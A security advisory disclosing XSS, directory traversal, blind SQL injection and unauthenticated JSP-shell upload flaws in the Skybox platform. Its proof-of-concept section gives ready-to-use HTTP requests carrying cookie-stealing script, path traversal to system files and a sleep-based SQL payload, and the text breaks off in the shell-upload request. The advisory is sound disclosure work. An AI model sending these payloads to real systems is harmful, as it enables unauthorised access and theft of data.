Vendor description:
-------------------
"Skybox Security provides cutting-edge risk analytics for enterprise security
management. Our solutions give you complete network visibility, help you
eliminate attack vectors, and optimize your security management processes.
Protect the network and the business."
Source: http://www.skyboxsecurity.com/

Business recommendation:
------------------------
Attackers are able to perform Cross-Site Scripting and SQL Injection attacks
against the Skybox platform. Furthermore, it is possible for
unauthenticated attackers to download arbitrary files and execute arbitrary
code.

SEC Consult recommends the vendor to conduct a comprehensive security
analysis, based on security source code reviews, in order to identify all
available vulnerabilities in the Skybox platform and increase the security
of its customers.

Vulnerability overview/description:
-----------------------------------
1) Multiple Reflected Cross-Site Scripting Vulnerabilities
2) Multiple Stored Cross-Site Scripting Vulnerabilities
3) Arbitrary File Download and Directory Traversal Vulnerability
4) Blind SQL Injection Vulnerability
5) Remote Unauthenticated Code Execution

Proof of concept:
-----------------
1) Multiple Reflected Cross-Site Scripting Vulnerabilities
Multiple scripts are prone to reflected Cross-Site Scripting attacks.
The following example demonstrates this issue with the
service VersionRepositoryWebService:

POST /skyboxview/webservice/services/VersionRepositoryWebService HTTP/1.0
Content-type: text/plain
User-Agent: Axis/1.4
Host: localhost:8282
SOAPAction: ""
Content-Length: 863
<?xml version="1.0" encoding="UTF-8"?><soapenv:Envelope
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><soapenv:Body><ns1:checkV
ersion
soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"
xmlns:ns1="http://com/skybox/view/webservice/versionrepositoryc4f85">&l
t;a
xmlns:a=&apos;http://www.w3.org/1999/xhtml&apos;><a:body
onload=&apos;alert(1)&apos;/></a>9884933253b"><components
soapenc:arrayType="soapenc:string[1]" xsi:type="soapenc:Array"

ntVersion
xsi:type="soapenc:string"
xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">7.0.601</currentVersi
on></ns1:checkVersion></soapenv:Body></soapenv:Envelope>

Other scripts and parameters, such as the parameter status of the login script
(located at https://localhost:444/login.html) are affected as well. The
following request demonstrates this issue:
https://localhost:444/login.html?status=%27%3C/script%3E%3Cscript%3Ealert%28doc
ument.cookie%29%3C/script%3E

2) Multiple Stored Cross-Site Scripting Vulnerabilities
Multiple fields of the Skybox Change Manager, which can be accessed at
https://localhost:8443/skyboxview/, are prone to stored Cross-Site Scripting
attacks. For example when creating a new ticket, the title can be misused
to insert JavaScript code. The following request to the server demonstrates
the issue:

Request:
POST /skyboxview/webskybox/tickets HTTP/1.1
Host: localhost:8443
[...]
7|0|18|https://localhost:8443/skyboxview/webskybox/|272....5E|com.skybox.view.g
wt.client.service.TicketsService|createAccessChangeTicket|com.skybox.view.trans
fer.netmodel.tickets.AccessChangeTicketData/1874789321|com.skybox.view.transfer

Id/1448062761|com.skybox.view.transfer.netmodel.tickets.ChangeRequestRiskEnum/8
52682809||skyboxview|test"><img
src=yy onerror=alert(document.cookie) >|java.util.ArrayList/41

Other fields, like "Comments" and "Description", are affected as well.

3) Arbitrary File Download and Directory Traversal Vulnerability
Skybox Change Manager allows to upload and download attachments for tickets.
The download functionality can be exploited to download arbitrary files. No
authentication is required to exploit this vulnerability. The following
request demonstrates the issue:
POST /skyboxview/webskybox/attachmentdownload HTTP/1.1
Host: localhost:8443
tempShortFileName=aaaaaa&tempFileName=../../../../../../../../../../../windows/
win.ini

The script /skyboxview/webskybox/filedownload is also affected by the same
vulnerability.

Note: The upload functionality can also be used to upload files without
authentication.

4) Blind SQL Injection Vulnerability
Arbitrary SQL queries can be inserted into the service VersionWebService. The
following request demonstrates this issue with a simple sleep statement:

POST https://localhost:8443/skyboxview/webservice/services/VersionWebService
HTTP/1.1
Accept-Encoding: gzip,deflate
Content-Type: text/xml;charset=UTF-8
SOAPAction: ""
Content-Length: 619
Host: localhost:8443
Connection: Keep-Alive
User-Agent: Apache-HttpClient/4.1.1 (java 1.5)
<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:ver="http://com/skybox/view/webservice/version">
   <soapenv:Header/>
   <soapenv:Body>
      <ver:getUserLockInSeconds
soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <username xsi:type="soapenc:string"
xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/">admin&apos;+(select
* from (select(sleep(20)))a)+&apos;</username>
      </ver:getUserLockInSeconds>
   </soapenv:Body>
</soapenv:Envelope>

No authentication is required to exploit this vulnerability.

5) Remote Unauthenticated Code Execution
It is possible to upload WAR files, containing for example JSP files, which
will be automatically deployed by the Skybox appliance. This way, it is
possible to upload a JSP shell which enables an attacker to execute arbitrary
commands running in the same context as the web server running (by default
skyboxview).
The following request to the Skyboxview update service (located at
https://localhost:9443) uploads a JSP file. It will be uploaded to
/opt/skyboxview/thirdparty/jboss/server/web/deploy where it is automatically
extracted and deployed at
/opt/skyboxview/thirdparty/jboss/server/web/work/jboss.web/localhost.

POST /skyboxview-softwareupdate/services/CollectorSoftwareUpdate HTTP/1.1
Accept-Encoding: gzip,deflate
SOAPAction: ""
Content-Type: multipart/related; type="text/xml";
start="<rootpart@soapui.org>";
